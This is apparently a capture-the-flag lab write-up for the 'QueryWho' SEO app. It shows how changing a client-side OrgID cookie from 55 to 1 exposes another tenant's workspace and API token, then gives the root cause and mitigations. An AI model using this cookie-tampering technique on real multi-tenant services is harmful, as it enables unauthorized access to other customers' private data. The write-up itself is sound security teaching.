---
title: "Client-Controlled OrgID Leads to Cross-Tenant Data Exposure | QueryWho"
date: 2026-06-20 09:30:00 +0530
categories: [A01 - Broken Access Control, IDOR]
tags: [idor, broken-access-control, cookie-tampering, multi-tenant, api-token-disclosure, webverselabs-pro, querywho]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/querywho-idor.webp
  alt: QueryWho IDOR lab cover
---

## Lab Link

[QueryWho - WebVerse Pro Daily Challenge](https://dashboard.webverselabs-pro.com/events/querywho)

---

## Overview

**QueryWho** is an SEO intelligence workspace application where users can view domain metrics, keyword rankings, backlink data, workspace settings, and API access details.

The application used a client-controlled cookie named `OrgID` to decide which organization’s data should be loaded. By modifying this cookie, it was possible to switch from the assigned workspace to another tenant’s workspace and view sensitive data that should not have been accessible.

The vulnerable behavior resulted in cross-tenant data exposure and revealed the flag inside another organization’s workspace API token field.

## Objective

The objective was to identify the access-control flaw, access unauthorized workspace data, and retrieve the flag.

## Vulnerability Identification

After opening the workspace, the application loaded the default organization:

```http
GET /index.php HTTP/2
Host: <LAB_HOST>
Cookie: OrgID=55; cf_clearance=<REDACTED>
```

The response showed that the current workspace was **Maplewood Supply Co**:

```html
<div class="ws-name">Maplewood Supply Co</div>
<span class="ws-id">ORG 55</span>
```

The dashboard also exposed a workspace API token:

```html
<div class="token-k">Workspace API token</div>
<code class="token">qw_live_<REDACTED></code>
```

This was an important clue. The application was relying on `OrgID=55` from the cookie to determine which workspace to display.

Because the organization identifier was stored client-side, I tested whether changing it would load another tenant’s data.

## Recon and Approach

The main pages available from the sidebar were:

```text
/index.php
/site-explorer.php
/keywords.php
/backlinks.php
/rank-tracker.php
/competitors.php
/settings.php
```

The most interesting pages were:

- `/index.php`, because it displayed the dashboard and workspace token.
- `/settings.php`, because it clearly showed workspace details and API access information.

The original request used:

```http
Cookie: OrgID=55; cf_clearance=<REDACTED>
```

I changed only the `OrgID` value and kept the Cloudflare clearance cookie unchanged.

## Exploitation

The vulnerable request was reproduced by changing the organization cookie from `55` to `1`.

```http
GET /index.php HTTP/2
Host: <LAB_HOST>
Cookie: OrgID=1; cf_clearance=<REDACTED>
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

The server accepted the modified cookie and returned a completely different workspace:

```html
<div class="ws-name">Helio Robotics</div>
<span class="ws-plan">Enterprise</span>
<span class="ws-id">ORG 1</span>
```

The page content also changed to the unauthorized tenant’s domain:

```html
<h1>Helio Robotics</h1>
<div class="domain-line"><span class="dom">heliorobotics.com</span></div>
```

This confirmed that the application trusted the client-controlled organization identifier without verifying whether the current user belonged to that organization.

## Proof and Flag

Inside the unauthorized **Helio Robotics** workspace, the application displayed the workspace API token field.

```html
<div class="token-k">Workspace API token</div>
<code class="token">WEBVERSE{...}</code>
```

The token field contained the flag.

```text
WEBVERSE{REDACTED}
```

## Root Cause

The root cause was broken object-level authorization.

The application used the `OrgID` cookie as a trusted source of authorization context:

```text
Cookie: OrgID=<organization_id>
```

Instead of deriving the user’s organization membership from a server-side session or database lookup, the backend accepted the organization ID supplied by the client and returned data for that organization.

This created an **Insecure Direct Object Reference** across tenants.

## Impact

An attacker could modify the `OrgID` cookie and access other organizations’ workspaces.

The exposed data included:

- Workspace names
- Primary domains
- Plan and seat information
- SEO metrics
- Keywords and backlinks
- Workspace API tokens
- Sensitive tenant data
- The challenge flag

In a real SaaS environment, this would be a critical multi-tenant isolation failure because one customer could access another customer’s private workspace data.

## Mitigation

The application should not trust client-controlled organization identifiers for authorization decisions.

Recommended fixes:

- Store the authenticated user’s organization membership server-side.
- Validate every workspace request against the logged-in user’s allowed organizations.
- Enforce object-level authorization on every route.
- Do not expose sensitive API tokens directly in dashboard HTML unless strictly necessary.
- Rotate workspace API tokens after fixing the access-control issue.
- Use indirect, non-guessable identifiers only as a defense-in-depth measure, not as the main authorization control.
- Add automated tests for cross-tenant access attempts.

## Lessons Learned

This lab demonstrates why multi-tenant applications must enforce authorization on the server side for every object access.

A cookie value such as `OrgID` can be useful as a UI preference or routing hint, but it must never be treated as proof that the user is authorized to access that organization.

The key takeaway:

```text
Client-controlled identifiers are not authorization.
```

Always verify ownership and membership server-side before returning tenant-specific data.
